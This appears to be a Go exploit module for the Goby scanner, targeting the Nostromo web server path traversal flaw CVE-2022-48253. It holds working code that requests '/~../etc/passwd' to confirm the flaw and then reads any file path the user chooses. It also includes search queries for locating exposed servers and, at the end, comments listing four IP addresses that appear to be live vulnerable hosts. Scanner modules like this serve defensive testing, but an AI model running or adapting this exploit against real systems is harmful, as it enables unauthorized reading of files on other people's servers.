package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Nostromo path traversal vulnerability（CVE-2022-48253）",
    "Description": "<p>Nostromo (aka nhttpd) is a simple and fast open source web server.</p><p>Nostromo 2.1 was affected by path traversal, which could allow an attacker to do arbitrary file reading and, if run with permissions, execute arbitrary commands on a remote server. (This vulnerability occurs when using the homedirs option)</p>",
    "Product": "nostromo",
    "Homepage": "http://www.nazgul.ch/dev_nostromo.html",
    "DisclosureDate": "2023-02-18",
    "Author": "635477622@qq.com",
    "FofaQuery": "header=\"Server: nostromo\" || banner=\"Server: nostromo\"||(header=\"Www-Authenticate: Basic realm=\" && header=\"nostromo\")||(header=\"Www-Authenticate: Basic realm=\" && title==\"401 unauthorized\")",
    "GobyQuery": "header=\"Server: nostromo\" || banner=\"Server: nostromo\"||(header=\"Www-Authenticate: Basic realm=\" && header=\"nostromo\")||(header=\"Www-Authenticate: Basic realm=\" && title==\"401 unauthorized\")",
    "Level": "3",
    "Impact": "<p>Nostromo 2.1 was affected by path traversal, which could allow an attacker to do arbitrary file reading and, if run with permissions, execute arbitrary commands on a remote server. (This vulnerability occurs when using the homedirs option)</p>",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"http://www.nazgul.ch/dev_nostromo.html\">http://www.nazgul.ch/dev_nostromo.html</a></p>",
    "References": [
        "https://www.soteritsecurity.com/blog/2023/01/nostromo_from_directory_traversal_to_RCE.html",
        "https://cve.report/CVE-2022-48253/eeeb5eee"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/etc/passwd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2022-48253"
    ],
    "CNNVD": [
        "CNNVD-202301-824"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Nostromo 路径穿越漏洞（CVE-2022-48253）",
            "Product": "nostromo",
            "Description": "<p>Nostromo （又名 nhttpd）是一款简单快速的开源Web服务器。</p><p>Nostromo 2.1 之前受到路径遍历的影响，可能允许攻击者进行任意文件读取，如果权限运行可以在远程服务器上执行任意命令。（当使用 homedirs 选项时会出现此漏洞）</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.nazgul.ch/dev_nostromo.html\" target=\"_blank\">http://www.nazgul.ch/dev_nostromo.html</a></p>",
            "Impact": "<p>Nostromo 2.1 之前受到路径遍历的影响，可能允许攻击者进行任意文件读取，如果权限运行可以在远程服务器上执行任意命令。（当使用 homedirs 选项时会出现此漏洞）</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Nostromo path traversal vulnerability（CVE-2022-48253）",
            "Product": "nostromo",
            "Description": "<p>Nostromo (aka nhttpd) is a simple and fast open source web server.<br></p><p>Nostromo 2.1 was affected by path traversal, which could allow an attacker to do arbitrary file reading and, if run with permissions, execute arbitrary commands on a remote server. (This vulnerability occurs when using the homedirs option)</p>",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"http://www.nazgul.ch/dev_nostromo.html\" target=\"_blank\">http://www.nazgul.ch/dev_nostromo.html</a></p>",
            "Impact": "<p>Nostromo 2.1 was affected by path traversal, which could allow an attacker to do arbitrary file reading and, if run with permissions, execute arbitrary commands on a remote server. (This vulnerability occurs when using the homedirs option)</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10714"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/~../etc/passwd")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				// 因为直接用 app= nostromo , 会有很多蜜罐。
				return !strings.Contains(resp.Utf8Html, "tomcat") && regexp.MustCompile("(?s)root:(x*?):0:0:").MatchString(resp.Utf8Html)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/~.." + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

// http://20.66.39.61
// http://20.66.39.61:18983
// http://20.219.193.68:26002
// http://20.219.193.68:4064
